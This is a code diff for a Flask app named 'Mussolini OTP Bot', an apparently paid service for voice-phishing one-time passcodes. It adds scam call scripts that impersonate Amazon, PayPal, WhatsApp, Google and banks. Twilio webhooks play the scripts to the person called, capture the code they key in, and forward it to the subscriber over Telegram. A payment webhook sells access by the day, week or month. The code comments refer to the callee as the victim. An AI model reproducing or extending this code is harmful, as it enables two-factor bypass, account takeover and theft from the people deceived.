@@ -8,11 +8,52 @@ import json
 
 app = Flask('')
 
+# ==========================================
+# 📜 DICCIONARIO DE GUIONES (SCRIPTS)
+# ==========================================
+# Aquí defines qué dice la voz para cada servicio.
+# Puedes añadir más servicios copiando el formato.
+SCRIPTS = {
+    "amazon": (
+        "Hello. This is Amazon Security Department. "
+        "We detected a suspicious purchase of an iPhone 15 Pro for $1,200 USD on your account. "
+        "If this was not you, please enter the 6-digit OTP code sent to your mobile device to cancel this order immediately."
+    ),
+    "paypal": (
+        "Hello. This is an automated alert from PayPal Fraud Prevention. "
+        "A login attempt was made from a new device in Russia. "
+        "To block this sign-in, please enter the security code sent to your text messages now."
+    ),
+    "whatsapp": (
+        "Hi. This is WhatsApp Support. "
+        "Someone is trying to register your number on a new device. "
+        "To prevent account theft, please enter the verification code displayed on your screen."
+    ),
+    "google": (
+        "This is Google Security. "
+        "We blocked a sign-in attempt to your Gmail account. "
+        "Please enter the Google verification code to secure your account."
+    ),
+    "bank": (
+        "Hello. This is the Fraud Department of your bank. "
+        "We noticed an unusual withdrawal request. "
+        "Please key in the one-time passcode sent to your phone to authorize or reject this transaction."
+    ),
+    # ⚠️ DEFAULT: Esto se usa si el servicio no está en la lista de arriba
+    "default": (
+        "Hello. This is an automated security call from {service}. "
+        "We detected unauthorized activity on your account. "
+        "Please enter the verification code sent to your mobile device to verify your identity."
+    )
+}
+
 @app.route('/')
 def home():
-    return "Mussolini OTP Bot - Systems Online."
+    return "Mussolini OTP Bot - Voice Engine Online."
 
-# --- HOODPAY ---
+# ==========================================
+# 1. WEBHOOK HOODPAY (PAGOS)
+# ==========================================
 @app.route('/webhook/hoodpay', methods=['POST'])
 def hoodpay_webhook():
     try:
@@ -25,13 +66,16 @@ def hoodpay_webhook():
             plan_type = metadata.get("plan_type")
             
             if user_id and plan_type:
-                days = 1 if "daily" in plan_type else 7 if "weekly" in plan_type else 30 if "monthly" in plan_type else 1
+                # Lógica de días
+                days = 1
+                if "weekly" in plan_type: days = 7
+                elif "monthly" in plan_type: days = 30
                 
                 success, new_date = add_subscription_days(user_id, days)
                 
                 if success:
                     try:
-                        bot.send_message(user_id, f"✅ **Payment Received!**\nPlan `{plan_type}` active until `{new_date}`.", parse_mode="Markdown")
+                        bot.send_message(user_id, f"✅ **Payment Received!**\nPlan `{plan_type}` active.", parse_mode="Markdown")
                         send_log(f"Pago Recibido: User {user_id} - Plan {plan_type}", level="PAYMENT")
                     except: pass
                 
@@ -41,23 +85,45 @@ def hoodpay_webhook():
         log_error(e, "Hoodpay Webhook")
         return jsonify({"status": "error"}), 500
 
-# --- TWILIO VOICE ---
+# ==========================================
+# 2. WEBHOOK TWILIO - GENERADOR DE VOZ
+# ==========================================
 @app.route('/twilio/voice', methods=['POST'])
 def twilio_voice():
-    service = request.args.get('service', 'Security')
+    """Twilio pregunta: ¿Qué le digo a la víctima?"""
+    # Obtenemos el servicio que puso el usuario (ej: Amazon, PayPal)
+    service_raw = request.args.get('service', 'Security')
     user_id = request.args.get('user_id')
     
-    resp = VoiceResponse()
-    gather = Gather(num_digits=8, action=f'/twilio/gather?user_id={user_id}&service={service}', method='POST', timeout=10)
+    # Normalizamos el nombre (todo a minúsculas) para buscarlo en el diccionario
+    service_key = service_raw.lower()
     
-    say_text = f"Hello. This is an automated alert from {service}. We blocked a suspicious attempt. Enter the security code sent to your mobile device."
+    # BUSCAMOS EL GUIÓN CORRECTO
+    if service_key in SCRIPTS:
+        # Si existe (ej: amazon), usamos ese texto específico
+        say_text = SCRIPTS[service_key]
+    else:
+        # Si no existe, usamos el "default" y le pegamos el nombre del servicio
+        say_text = SCRIPTS["default"].format(service=service_raw)
+    
+    resp = VoiceResponse()
+    
+    # Configuración de captura (DTMF)
+    gather = Gather(num_digits=8, action=f'/twilio/gather?user_id={user_id}&service={service_raw}', method='POST', timeout=10)
+    
+    # Alice es la voz de mujer estándar de Twilio (en inglés US)
     gather.say(say_text, voice='alice', language='en-US')
     
     resp.append(gather)
-    resp.say("No input received. Goodbye.")
+    
+    # Si la víctima no hace nada, repetimos o colgamos
+    resp.say("We did not receive any input. Goodbye.", voice='alice')
+    
     return Response(str(resp), mimetype='text/xml')
 
-# --- TWILIO GATHER ---
+# ==========================================
+# 3. WEBHOOK TWILIO - CAPTURA DE CÓDIGO
+# ==========================================
 @app.route('/twilio/gather', methods=['POST'])
 def twilio_gather():
     digits = request.values.get('Digits')
@@ -65,12 +131,19 @@ def twilio_gather():
     service = request.args.get('service')
     
     resp = VoiceResponse()
+
     if digits and user_id:
+        # 1. Enviar el código a Telegram
         try:
             bot.send_message(user_id, f"🎹 **OTP CAPTURED!**\n👤 Service: {service}\n🔢 Code: `{digits}`", parse_mode="Markdown")
             send_log(f"OTP Capturado para {user_id}: {digits}", level="SUCCESS")
         except: pass
-        resp.say("Thank you. Goodbye.", voice='alice')
+
+        # 2. Mensaje final a la víctima
+        resp.say("Thank you. Your account has been verified.", voice='alice')
+    else:
+        resp.say("Invalid input.", voice='alice')
+
     return Response(str(resp), mimetype='text/xml')
 
 def run():
